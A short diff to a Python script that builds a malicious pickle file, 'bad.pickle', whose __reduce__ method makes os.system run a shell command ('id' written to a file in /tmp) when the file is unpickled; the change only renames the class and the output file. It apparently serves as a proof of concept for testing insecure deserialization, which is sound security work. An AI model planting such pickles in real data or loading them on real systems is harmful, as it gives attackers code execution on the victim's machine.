@@ -2,11 +2,11 @@ import pickle
 import os
 import requests
 
-class Pickle(object):
+class MyObject(object):
     def __reduce__(self):
-        return os.system, ('id > /tmp/proof',)
+        return os.system, ('id > /tmp/cmd',)
 
-o = Pickle()
+o = MyObject()
 p = pickle.dump(o, open('bad.pickle', 'wb'))
 
 
